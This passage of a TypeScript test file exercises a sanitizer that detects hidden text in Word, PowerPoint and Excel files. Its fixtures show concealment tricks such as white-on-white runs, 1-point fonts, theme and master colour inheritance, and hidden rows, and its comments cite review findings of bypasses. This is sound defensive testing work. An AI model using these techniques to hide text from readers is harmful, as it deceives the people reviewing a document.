  '<p:bodyStyle><a:lvl1pPr><a:defRPr sz="100"><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill></a:defRPr></a:lvl1pPr></p:bodyStyle>' +
  '<p:otherStyle><a:lvl1pPr><a:defRPr sz="1800"/></a:lvl1pPr></p:otherStyle></p:txStyles>'
const NOTES_TXSTYLES = `<p:txStyles><p:notesStyle>${WHITE_1PT}</p:notesStyle></p:txStyles>`

describe('#492: the resolver is fail-closed — provable visibility, by contrast', () => {
  it('white and near-white text on the page count; grey footnotes and coloured headings do not', async () => {
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETWHITE', '<w:color w:val="FFFFFF"/>')}` +
      `${run('SECRETNEARWHITE', '<w:color w:val="FFFFFE"/>')}` +
      `${run('GREYFOOTNOTE', '<w:color w:val="595959"/>')}` +
      `${run('BLUEHEADING', '<w:color w:val="4F81BD"/>')}` +
      // The boundary itself, measured: D9D9D9 is 1.412 and passes as visibly
      // distinct; E0E0E0 is 1.32 and does not.
      `${run('GREYD9CONTROL', '<w:color w:val="D9D9D9"/>')}` +
      `${run('SECRETE0GREY', '<w:color w:val="E0E0E0"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 3 })
  })

  it('white text on a dark background is provably visible and does not count', async () => {
    const body =
      `<w:p><w:pPr><w:shd w:val="clear" w:fill="0A0A0A"/></w:pPr>` +
      `${run('WHITEONDARK', '<w:color w:val="FFFFFF"/>')}</w:p>` +
      `<w:p>${run('VISIBLE')}${run('BLACKONBLACK', '<w:color w:val="000000"/><w:shd w:val="clear" w:fill="000000"/>')}</w:p>` +
      // A solid shading draws w:color, not w:fill — hiding there counts too.
      `<w:p>${run('SECRETSOLID', '<w:color w:val="000000"/><w:shd w:val="solid" w:color="000000" w:fill="auto"/>')}</w:p>` +
      // And one written with no w:val at all, the way real documents shade
      // table cells: the default is clear, so the fill paints and hides.
      `<w:p><w:pPr><w:shd w:fill="000000"/></w:pPr>${run('SECRETNOVALSHD', '<w:color w:val="000000"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 3 })
  })

  it('a pattern shading is checked against both its colours', async () => {
    const pat = '<w:shd w:val="pct50" w:color="0A0A0A" w:fill="FFFFFF"/>'
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETONPATTERN', `<w:color w:val="000000"/>${pat}`)}` +
      `${run('GREYONPATTERN', `<w:color w:val="595959"/>${pat}`)}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('a w:shd whose pattern the resolver does not model counts as unknown-property', async () => {
    const body = `<w:p>${run('VISIBLE')}${run('SECRETWEIRDSHD', '<w:shd w:val="weird"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'unknown-property': 1 })
  })

  it('the theme part is read: a theme whose light colour is dark makes light1 text visible', async () => {
    const body = `<w:p>${run('VISIBLE')}${run('SECRETTHEMELIGHT', '<w:color w:val="000000" w:themeColor="light1"/>')}</w:p>`
    const bytes = (lt1: string): Uint8Array =>
      docx({
        body,
        parts: [{ name: 'word/theme/theme1.xml', type: CT.theme, body: aTheme(lt1) }],
        docRels: [{ id: 'rIdTheme', type: RT.theme, target: 'theme/theme1.xml' }],
      })
    const dark = await disarmed(bytes('0A0A0A'), MIME.docx, [])
    expect(dark.counted).toEqual({})
    const light = await disarmed(bytes('FFFFFF'), MIME.docx, [])
    expect(light.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('themeTint and themeShade resolve: shaded light1 stays visible, tinted dark1 goes white', async () => {
    const tinted =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETTINTEDTEXT', '<w:color w:val="000000" w:themeColor="dark1" w:themeTint="FF"/>')}</w:p>`
    expect((await disarmed(docx({ body: tinted }), MIME.docx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
    const shaded =
      `<w:p>${run('VISIBLE')}` +
      `${run('SHADEDLIGHT', '<w:color w:val="000000" w:themeColor="light1" w:themeShade="FF"/>')}</w:p>`
    expect((await disarmed(docx({ body: shaded }), MIME.docx, [])).counted).toEqual({})
  })

  it('cascade order: direct formatting beats the style, which beats docDefaults', async () => {
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        '<w:docDefaults><w:rPrDefault><w:rPr><w:color w:val="000000"/></w:rPr></w:rPrDefault></w:docDefaults>' +
        '<w:style w:type="character" w:styleId="Pale"><w:rPr><w:color w:val="E8E8E8"/></w:rPr></w:style>',
    )
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETPALESTYLE', '<w:rStyle w:val="Pale"/>')}` +
      `${run('OVERRIDDEN', '<w:rStyle w:val="Pale"/><w:color w:val="595959"/>')}</w:p>` +
      // docDefaults hide on a black paragraph; the direct control survives.
      `<w:p><w:pPr><w:shd w:val="clear" w:fill="000000"/></w:pPr>` +
      `${run('YELLOWCONTROL', '<w:color w:val="FFFF00"/>')}${run('SECRETBARE')}</w:p>`
    const out = await disarmed(docx({ body, styles }), MIME.docx, [])
    expect(out.counted).toEqual({ 'colour-contrast': 2 })
  })

  it('a 1% character scale (w:w) makes the effective size too small — the #486 shape', async () => {
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETSCALED', '<w:sz w:val="40"/><w:w w:val="1"/>')}` +
      `${run('WIDECONTROL', '<w:sz w:val="40"/><w:w w:val="50"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ 'too-small': 1 })
  })

  it('a rendering property outside the allowlist counts as unknown-property, directly or through a style', async () => {
    const w14 = 'http://schemas.microsoft.com/office/word/2010/wordml'
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        `<w:style w:type="character" w:styleId="Ghost"><w:rPr><w14:textFill xmlns:w14="${w14}">` +
        '<w14:noFill/></w14:textFill></w:rPr></w:style>',
    )
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETW14TEXTFILL', `<w14:textFill xmlns:w14="${w14}"><w14:noFill/></w14:textFill>`)}` +
      `${run('SECRETGHOSTSTYLE', '<w:rStyle w:val="Ghost"/>')}` +
      // Ordinary formatting the allowlist judges unable to conceal: bold,
      // italic, underline, caps, kerning, sub/superscript, letter spacing,
      // typography extensions, and raised text within the layout bound.
      `${run('BOLDITALIC', `<w:b/><w:i/><w:u w:val="single"/><w:smallCaps/><w:kern w:val="2"/><w:spacing w:val="20"/><w:vertAlign w:val="superscript"/><w14:ligatures xmlns:w14="${w14}" w14:val="standard"/><w:position w:val="8"/>`)}</w:p>`
    const out = await disarmed(docx({ body, styles }), MIME.docx, [])
    expect(out.counted).toEqual({ 'unknown-property': 2 })
  })

  it('a raised or lowered run beyond the bound has left the line, which is the layout class', async () => {
    const body =
      `<w:p>${run('VISIBLE')}` +
      `${run('SECRETLEFTPAGE', '<w:position w:val="-2000"/>')}` +
      `${run('RAISEDCONTROL', '<w:position w:val="8"/>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(out.counted).toEqual({ layout: 1 })
  })
})

describe('#492: pptx runs resolve through their shapes, their slides, and the parts behind them', () => {
  it('a run’s background is the shape’s fill, else the slide’s, else the layout’s, else the master’s, else white', async () => {
    const whiteRun = '<a:rPr><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill></a:rPr>'
    const blackFill = '<a:solidFill><a:srgbClr val="0A0A0A"/></a:solidFill>'
    const blackBg =
      '<p:bgPr><a:solidFill><a:srgbClr val="0A0A0A"/></a:solidFill><a:effectLst/></p:bgPr>'
    const white = (sentinel: string) => shape(sentinel, { id: 3, rPr: whiteRun })
    const counted = async (bytes: Uint8Array) => (await disarmed(bytes, MIME.pptx, [])).counted
    expect(
      await counted(
        pptx({
          slides: [
            {
              shapes:
                shape('VISIBLE') +
                shape('WHITEONBLACKSHAPE_CONTROL', { id: 3, rPr: whiteRun, spPr: blackFill }),
            },
          ],
        }),
      ),
    ).toEqual({})
    expect(await counted(pptx({ slides: [{ bg: blackBg, shapes: white('VISIBLE') }] }))).toEqual({})
    expect(
      await counted(
        pptx({
          slides: [{ shapes: white('VISIBLE') }],
          style: {
            layouts: [pStylePart('sldLayout', '', '', blackBg)],
            master: pStylePart('sldMaster', '', CLR_MAP),
          },
        }),
      ),
    ).toEqual({})
    expect(
      await counted(
        pptx({
          slides: [{ shapes: white('VISIBLE') }],
          style: {
            layouts: [pStylePart('sldLayout')],
            master: pStylePart('sldMaster', '', CLR_MAP, blackBg),
          },
        }),
      ),
    ).toEqual({})
    expect(
      await counted(pptx({ slides: [{ shapes: white('SECRETWHITEPAGE') + shape('VISIBLE') }] })),
    ).toEqual({
      'colour-contrast': 1,
    })
  })

  it('a shape’s p:style fillRef resolves through the theme’s fill scheme', async () => {
    const theme = FMT_THEME(
      '<a:solidFill><a:srgbClr val="0A0A0A"/></a:solidFill><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill>',
    )
    const fillRef = (idx: number): string =>
      `<p:style><a:lnRef idx="1"><a:schemeClr val="accent1"/></a:lnRef>` +
      `<a:fillRef idx="${idx}"><a:schemeClr val="accent1"/></a:fillRef>` +
      '<a:effectRef idx="0"><a:schemeClr val="accent1"/></a:effectRef><a:fontRef idx="minor"/></p:style>'
    const whiteRun = '<a:rPr><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill></a:rPr>'
    const spec = (idx: number, sentinel: string) =>
      pptx({
        slides: [
          {
            shapes:
              shape(sentinel, { id: 3, rPr: whiteRun, style: fillRef(idx) }) + shape('VISIBLE'),
          },
        ],
        presentationRels: [{ id: 'rIdTheme', type: RT.theme, target: 'theme/theme1.xml' }],
        parts: [{ name: 'ppt/theme/theme1.xml', type: CT.theme, body: theme }],
      })
    expect((await disarmed(spec(1, 'FILLREFONE_CONTROL'), MIME.pptx, [])).counted).toEqual({})
    expect((await disarmed(spec(2, 'SECRETFILLREF'), MIME.pptx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
  })

  it('a shape background the resolver does not model makes the run unknown-property', async () => {
    const blackRun = '<a:rPr><a:solidFill><a:srgbClr val="000000"/></a:solidFill></a:rPr>'
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('SECRETBLIPBG', {
                id: 3,
                rPr: blackRun,
                spPr: '<a:blipFill><a:blip r:embed="rIdNone"/></a:blipFill>',
              }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'unknown-property': 1 })
  })

  it('a pattern TEXT fill is read against both its colours, like a gradient', async () => {
    const whitePattern =
      '<a:rPr><a:pattFill><a:fgClr><a:srgbClr val="FFFFFF"/></a:fgClr>' +
      '<a:bgClr><a:srgbClr val="FFFFFF"/></a:bgClr></a:pattFill></a:rPr>'
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes: shape('VISIBLE') + shape('SECRETPATTERNTEXT', { id: 4, rPr: whitePattern }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('gradients resolve stop by stop, and transparency is read', async () => {
    const grad = (a: string, b: string): string =>
      `<a:gradFill><a:gsLst><a:gs pos="0"><a:srgbClr val="${a}"/></a:gs>` +
      `<a:gs pos="100000"><a:srgbClr val="${b}"/></a:gs></a:gsLst></a:gradFill>`
    const alpha = (v: number): string =>
      `<a:solidFill><a:srgbClr val="000000"><a:alpha val="${v}"/></a:srgbClr></a:solidFill>`
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('SECRETALLWHITEGRAD', {
                id: 3,
                rPr: `<a:rPr>${grad('FFFFFF', 'FFFFFF')}</a:rPr>`,
              }) +
              shape('MIXEDGRADCONTROL', {
                id: 4,
                rPr: `<a:rPr>${grad('FFFFFF', '0A0A0A')}</a:rPr>`,
              }) +
              shape('SECRETALPHA0', { id: 5, rPr: `<a:rPr>${alpha(0)}</a:rPr>` }) +
              shape('ALPHA40CONTROL', { id: 6, rPr: `<a:rPr>${alpha(40000)}</a:rPr>` }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 2 })
  })

  it('normAutofit fontScale composes with the size', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('SECRETFONTSCALE', {
                id: 3,
                rPr: '<a:rPr sz="2400"/>',
                bodyPr: '<a:normAutofit fontScale="4000" lnSpcReduction="0"/>',
              }) +
              shape('FONTSCALECONTROL', {
                id: 4,
                rPr: '<a:rPr sz="2400"/>',
                bodyPr: '<a:normAutofit fontScale="50000" lnSpcReduction="0"/>',
              }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'too-small': 1 })
  })

  it('an un-modelled rPr mechanism on a pptx run counts as unknown-property', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('SECRETSOFTEDGE', {
                id: 3,
                rPr: '<a:rPr><a:effectLst><a:softEdge rad="6350"/></a:effectLst></a:rPr>',
              }) +
              shape('SECRETEXTLST', {
                id: 4,
                rPr: '<a:rPr><a:extLst><a:ext uri="urn:test"/></a:extLst></a:rPr>',
              }) +
              // Ordinary formatting the allowlist judges unable to conceal:
              // bold, caps, letter spacing, sub/superscript, underline — and
              // an EMPTY effect list, or one of shadows only.
              shape('BOLDSPCCAPS', {
                id: 5,
                rPr: '<a:rPr b="1" spc="400" cap="all" baseline="30000" u="sng"><a:effectLst><a:outerShdw blurRad="50800" dist="38100"><a:srgbClr val="000000"/></a:outerShdw></a:effectLst></a:rPr>',
              }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'unknown-property': 2 })
  })
})

describe('#492: masters and layouts are read for resolution and never emitted', () => {
  it('a layout’s list-style defaults resolve for the slide’s placeholder runs', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('SECRETLAYOUTBODY', { id: 3, ph: 'body' }) +
              paraDefShape('SECRETPARADEF') +
              shape('SECRETLAYOUTTITLE', { id: 4, ph: 'title' }) +
              shape('DIRECTCONTROL', {
                id: 5,
                ph: 'body',
                rPr: '<a:rPr sz="2400"><a:solidFill><a:srgbClr val="595959"/></a:solidFill></a:rPr>',
              }),
          },
        ],
        style: {
          layouts: [pStylePart('sldLayout', phShape(WHITE_1PT))],
          master: pStylePart('sldMaster', '', CLR_MAP),
        },
      }),
      MIME.pptx,
      [],
    )
    // The body placeholder inherits the layout body placeholder's white 1-pt
    // level 1; the paragraph's own a:pPr/a:defRPr hides its run the same way.
    // The title placeholder has no matching layout placeholder and the master
    // has no txStyles, so it inherits nothing — its default text is visible.
    expect(out.counted).toEqual({ 'colour-contrast': 2, 'too-small': 2 })
  })

  it('a master’s txStyles resolve through the layout, and the layout wins', async () => {
    const master = pStylePart('sldMaster', '', CLR_MAP + MASTER_TXSTYLES)
    const masterOnly = await disarmed(
      pptx({
        slides: [{ shapes: shape('VISIBLE') + shape('SECRETMASTERBODY', { id: 3, ph: 'body' }) }],
        style: { layouts: [pStylePart('sldLayout')], master },
      }),
      MIME.pptx,
      [],
    )
    expect(masterOnly.counted).toEqual({ 'colour-contrast': 1, 'too-small': 1 })
    const layoutWins = await disarmed(
      pptx({
        slides: [{ shapes: shape('VISIBLE') + shape('LAYOUTCONTROL', { id: 3, ph: 'body' }) }],
        style: { layouts: [pStylePart('sldLayout', phShape(GREY_24))], master },
      }),
      MIME.pptx,
      [],
    )
    expect(layoutWins.counted).toEqual({})
  })

  it('the master’s colour map is read: a flipped tx1 remaps the resolved text colour', async () => {
    const flipped = CLR_MAP.replace('tx1="dk1"', 'tx1="lt1"')
    const tx1Run = '<a:rPr><a:solidFill><a:schemeClr val="tx1"/></a:solidFill></a:rPr>'
    const black = '<a:rPr><a:solidFill><a:srgbClr val="000000"/></a:solidFill></a:rPr>'
    const spec = (clrMap: string, sentinel: string) =>
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE', { rPr: black }) +
              shape(sentinel, { id: 3, ph: 'body', rPr: tx1Run }),
          },
        ],
        style: { layouts: [pStylePart('sldLayout')], master: pStylePart('sldMaster', '', clrMap) },
      })
    expect((await disarmed(spec(CLR_MAP, 'STANDARDTX1_CONTROL'), MIME.pptx, [])).counted).toEqual(
      {},
    )
    expect((await disarmed(spec(flipped, 'SECRETFLIPPEDTX1'), MIME.pptx, [])).counted).toEqual({
      'colour-contrast': 1,
    })
  })

  it('notes inherit from the notes master', async () => {
    const out = await disarmed(
      pptx({
        slides: [{ shapes: shape('VISIBLE'), notes: 'SECRETNOTESBODY', notesPh: 'body' }],
        style: { notesMaster: pStylePart('notesMaster', '', CLR_MAP + NOTES_TXSTYLES) },
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1, 'too-small': 1 })
  })

  it('a slide whose layout points at a missing part, or one of the wrong type, is unknown-property — never a silent bypass', async () => {
    const rels = (target: string): Rel[] => [{ id: 'rIdLayout', type: RT.slideLayout, target }]
    const missing = pptx({
      slides: [
        {
          shapes: shape('VISIBLE') + shape('SECRETTEXT', { id: 3 }),
          rels: rels('slideLayouts/slideLayout9.xml'),
        },
      ],
    })
    expect((await disarmed(missing, MIME.pptx, [])).counted).toEqual({ 'unknown-property': 2 })
    const wrongType = pptx({
      slides: [
        {
          shapes: shape('VISIBLE') + shape('SECRETTEXT', { id: 3 }),
          rels: rels('../slides/slide1.xml'),
        },
      ],
    })
    expect((await disarmed(wrongType, MIME.pptx, [])).counted).toEqual({ 'unknown-property': 2 })
  })

  it('the layout, master and notes master parts are never in the output, nor their relationships', async () => {
    const out = await ooxmlDisarm(
      pptx({
        slides: [{ shapes: shape('VISIBLE'), notes: 'NOTESKEPT', notesPh: 'body' }],
        style: {
          layouts: [pStylePart('sldLayout', phShape(WHITE_1PT))],
          master: pStylePart('sldMaster', '', CLR_MAP + MASTER_TXSTYLES),
          notesMaster: pStylePart('notesMaster', '', CLR_MAP + NOTES_TXSTYLES),
        },
      }),
      MIME.pptx,
    )
    const list = names(out.bytes).map((n) => n.toLowerCase())
    expect(list).not.toContain('ppt/slidelayouts/slidelayout1.xml')
    expect(list).not.toContain('ppt/slidemasters/slidemaster1.xml')
    expect(list).not.toContain('ppt/notesmasters/notesmaster1.xml')
    const all = everything(out.bytes).toLowerCase()
    expect(all).not.toContain('slidelayout')
    expect(all).not.toContain('slidemaster')
    expect(all).not.toContain('notesmaster')
    // They left as dropped parts, labelled by what they were.
    expect(out.removed.otherParts).toBe(3)
  })
})

describe('#492: xlsx cells resolve through their styles, their fills and their formats', () => {
  const xf = (numFmtId: number, fontId: number, fillId: number): string =>
    `<xf numFmtId="${numFmtId}" fontId="${fontId}" fillId="${fillId}"/>`
  const cells = (list: readonly (readonly [s: number, t: string, ref: string])[]): string =>
    `<sheetData><row r="1">${list
      .map(([s, t, ref]) => `<c r="${ref}" s="${s}" t="inlineStr"><is><t>${t}</t></is></c>`)
      .join('')}</row></sheetData>`

  it('a 1 pt font and a 1 pt rich-text run count as too-small', async () => {
    const styles = sStyles({
      fonts: ['<font><sz val="11"/></font>', '<font><sz val="1"/><color rgb="FF000000"/></font>'],
      fills: ['<fill><patternFill patternType="none"/></fill>'],
      xfs: [xf(0, 0, 0), xf(0, 1, 0)],
    })
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells([
              [0, 'VISIBLE', 'A1'],
              [1, 'SECRETTINYFONT', 'B1'],
            ]),
          },
        ],
        styles,
      }),
      MIME.xlsx,
      [],
    )
    const sst =
      `<sst xmlns="${NS.s}"><si><r><t>VISIBLE</t></r></si>` +
      '<si><r><rPr><sz val="1"/><color rgb="FF000000"/></rPr><t>SECRETTINYRUN</t></r></si></sst>'
    const rich = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: '<sheetData><row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c></row></sheetData>',
          },
        ],
        styles: sStyles({ xfs: [xf(0, 0, 0)] }),
        sharedStrings: sst,
      }),
      MIME.xlsx,
      [],
    )
    expect(out.counted).toEqual({ 'too-small': 1 })
    expect(rich.counted).toEqual({ 'too-small': 1 })
  })

  it('a pattern fill is checked against both its colours, and [White] resolves against the fill', async () => {
    const styles = sStyles({
      fonts: ['<font><sz val="11"/><color rgb="FF000000"/></font>'],
      fills: [
        '<fill><patternFill patternType="none"/></fill>',
        '<fill><patternFill patternType="lightUp"><fgColor rgb="FF0A0A0A"/><bgColor rgb="FFFFFFFF"/></patternFill></fill>',
        '<fill><patternFill patternType="solid"><fgColor rgb="FF000000"/></patternFill></fill>',
      ],
      numFmts: '<numFmt numFmtId="165" formatCode="[White]@"/>',
      xfs: [xf(0, 0, 0), xf(0, 0, 1), xf(165, 0, 2)],
    })
    // A black font on a half-black pattern: the black half conceals it.
    const pattern = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells([
              [0, 'VISIBLE', 'A1'],
              [1, 'SECRETONPATTERN', 'B1'],
            ]),
          },
        ],
        styles,
      }),
      MIME.xlsx,
      [],
    )
    // [White]@ over a solid black fill: white on black is visible.
    const whiteFormat = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells([
              [0, 'VISIBLE', 'A1'],
              [2, 'WHITEFORMAT_CONTROL', 'B1'],
            ]),
          },
        ],
        styles,
      }),
      MIME.xlsx,
      [],
    )
    // [White]@ over no fill at all: white on white, concealed.
    const bare = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells([
              [0, 'VISIBLE', 'A1'],
              [1, 'SECRETWHITEFORMAT', 'B1'],
            ]),
          },
        ],
        styles: sStyles({
          fonts: ['<font><sz val="11"/></font>'],
          numFmts: '<numFmt numFmtId="165" formatCode="[White]@"/>',
          xfs: [xf(0, 0, 0), xf(165, 0, 0)],
        }),
      }),
      MIME.xlsx,
      [],
    )
    expect(pattern.counted).toEqual({ 'colour-contrast': 1 })
    expect(whiteFormat.counted).toEqual({})
    expect(bare.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('an automatic font colour renders black: on a dark fill it cannot contrast', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: cells([
              [0, 'VISIBLE', 'A1'],
              [1, 'SECRETAUTOONDARK', 'B1'],
            ]),
          },
        ],
        styles: sStyles({
          fonts: ['<font><sz val="11"/><color auto="1"/></font>'],
          fills: [
            '<fill><patternFill patternType="none"/></fill>',
            '<fill><patternFill patternType="solid"><fgColor rgb="FF000000"/></patternFill></fill>',
          ],
          xfs: [xf(0, 0, 0), xf(0, 0, 1)],
        }),
      }),
      MIME.xlsx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  it('the counted keys are exactly the five reasons', async () => {
    const w14 = 'http://schemas.microsoft.com/office/word/2010/wordml'
    const word = await disarmed(
      docx({
        body:
          `<w:p>${run('SECRETWHITE', '<w:color w:val="FFFFFF"/>')}` +
          `${run('SECRETTINY', '<w:sz w:val="2"/>')}` +
          `${run('SECRETUNKNOWN', `<w14:textFill xmlns:w14="${w14}"><w14:noFill/></w14:textFill>`)}${run('VISIBLE')}</w:p>`,
      }),
      MIME.docx,
      [],
    )
    expect(Object.keys(word.counted).sort()).toEqual([
      'colour-contrast',
      'too-small',
      'unknown-property',
    ])

    const sheet =
      '<cols><col min="1" max="1" hidden="1"/></cols>' +
      `<sheetData>${row(1, ['VISIBLE'])}${row(2, ['FLAGROW'], ' hidden="1"')}${row(3, ['ZERO'], ' ht="0" customHeight="1"')}</sheetData>`
    const book = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, [])
    expect(Object.keys(book.counted).sort()).toEqual(['hidden-flag', 'too-small'])

    const off = '<a:xfrm><a:off x="9144000" y="0"/><a:ext cx="100" cy="100"/></a:xfrm>'
    const laid = await disarmed(
      pptx({
        slides: [{ shapes: shape('VISIBLE') + shape('OFFSLIDEKEPT', { id: 6, xfrm: off }) }],
      }),
      MIME.pptx,
      [],
    )
    expect(Object.keys(laid.counted)).toEqual(['layout'])
  })
})

describe('#492 F2: the resolver costs CPU linear in the part', () => {
  it('placeholder runs resolving through layout and master cost no more than the same shapes without placeholders', async () => {
    const ph = Array.from({ length: 1_500 }, (_, i) =>
      shape(`s${i}`, { id: i + 2, ph: 'body' }),
    ).join('')
    const plain = Array.from({ length: 1_500 }, (_, i) => shape(`s${i}`, { id: i + 2 })).join('')
    const bytes = pptx({
      slides: [{ shapes: ph }],
      style: {
        layouts: [pStylePart('sldLayout', phShape(WHITE_1PT))],
        master: pStylePart('sldMaster', '', CLR_MAP + MASTER_TXSTYLES),
      },
    })
    const base = pptx({ slides: [{ shapes: plain }] })
    const ratio =
      (await cpuMs(() => ooxmlDisarm(bytes, MIME.pptx))) /
      (await cpuMs(() => ooxmlDisarm(base, MIME.pptx)))
    expect(ratio).toBeLessThan(2)
  }, 120_000)
})

// ============================================================================
// #495 review: a mechanism that reads as a KNOWN state must still resolve
// ============================================================================

/**
 * The security review of PR #495 proved nine bypasses in #492's own class:
 * colour/fill/size mechanisms the resolver read as a KNOWN state — none,
 * auto, an inert-list entry, or "the fill beneath" — instead of resolving
 * them or counting `unknown-property`. Each pin below is one finding's
 * probe, in the reviewer's terms: the mechanism resolves, or it counts.
 */
describe('#495 review: a mechanism that reads as a KNOWN state must still resolve', () => {
  const xf495 = (numFmtId: number, fontId: number, fillId: number): string =>
    `<xf numFmtId="${numFmtId}" fontId="${fontId}" fillId="${fillId}"/>`
  const cells495 = (list: readonly (readonly [s: number, t: string, ref: string])[]): string =>
    `<sheetData><row r="1">${list
      .map(([s, t, ref]) => `<c r="${ref}" s="${s}" t="inlineStr"><is><t>${t}</t></is></c>`)
      .join('')}</row></sheetData>`

  // Finding 1: Automatic renders black, and does not adapt to any fill.
  it('a colourless docx run over a dark cell fill cannot contrast (Automatic is black)', async () => {
    const body =
      '<w:tbl><w:tblGrid><w:gridCol/></w:tblGrid><w:tr><w:tc>' +
      '<w:tcPr><w:shd w:val="clear" w:fill="000000"/></w:tcPr>' +
      `<w:p>${run('SECRETAUTOCELL')}</w:p></w:tc></w:tr></w:tbl>` +
      `<w:p>${run('AUTOWHITECONTROL')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [], 'AUTOWHITECONTROL')
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 2: a pptx text highlight is a background drawn over every other.
  it('a pptx text highlight is the background behind the glyph, over every other background', async () => {
    const white =
      '<a:rPr><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill><a:highlight><a:srgbClr val="FFFFFF"/></a:highlight></a:rPr>'
    const blackShape = '<a:solidFill><a:srgbClr val="000000"/></a:solidFill>'
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('SECRETHIGHLIGHTED', { id: 3, rPr: white, spPr: blackShape }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 3: a pptx table cell fill is the background of its text. The
  // grey-on-grey cell counts once the fill resolves; before that its grey
  // text read as grey-on-white, visibly distinct.
  it('a pptx table cell fill is the background of its text', async () => {
    const tc = (text: string, fill: string, rPr: string) =>
      `<a:tc><a:txBody><a:bodyPr/><a:p><a:r>${rPr}<a:t>${text}</a:t></a:r></a:p></a:txBody><a:tcPr>${fill}</a:tcPr></a:tc>`
    const table = (cells: string) =>
      '<p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="4" name="T"/><p:cNvGraphicFramePr/><p:nvPr/></p:nvGraphicFramePr>' +
      '<a:graphic><a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table"><a:tbl><a:tblPr/>' +
      `<a:tr>${cells}</a:tr></a:tbl></a:graphicData></a:graphic></p:graphicFrame>`
    const grey = '<a:solidFill><a:srgbClr val="333333"/></a:solidFill>'
    const greyText = '<a:rPr><a:solidFill><a:srgbClr val="333333"/></a:solidFill></a:rPr>'
    const out = await disarmed(
      pptx({
        slides: [{ shapes: shape('VISIBLE') + table(tc('SECRETTABLECELL', grey, greyText)) }],
      }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1 })
  })

  // Finding 4: a:fld and OMML m:r runs are text-bearing and count like any run.
  it('a:fld and OMML m:r runs are text-bearing and count like any run', async () => {
    const spWith = (inner: string) =>
      '<p:sp><p:nvSpPr><p:cNvPr id="5" name="S"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr/>' +
      `<p:txBody><a:bodyPr/><a:p>${inner}</a:p></p:txBody></p:sp>`
    const fld =
      '<a:fld type="slidenum" id="{00000000-0000-0000-0000-000000000000}"><a:rPr sz="100"><a:solidFill>' +
      '<a:srgbClr val="FFFFFF"/></a:solidFill></a:rPr><a:t>SECRETFIELD</a:t></a:fld>'
    const out = await disarmed(
      pptx({ slides: [{ shapes: shape('VISIBLE') + spWith(fld) }] }),
      MIME.pptx,
      [],
    )
    expect(out.counted).toEqual({ 'colour-contrast': 1, 'too-small': 1 })
    const omml = `<m:r><w:rPr><w:color w:val="FFFFFF"/><w:sz w:val="2"/></w:rPr><m:t>SECRETOMML</m:t></m:r>`
    const word = await disarmed(
      docx({ body: `${para('VISIBLE')}<w:p>${omml}</w:p>` }),
      MIME.docx,
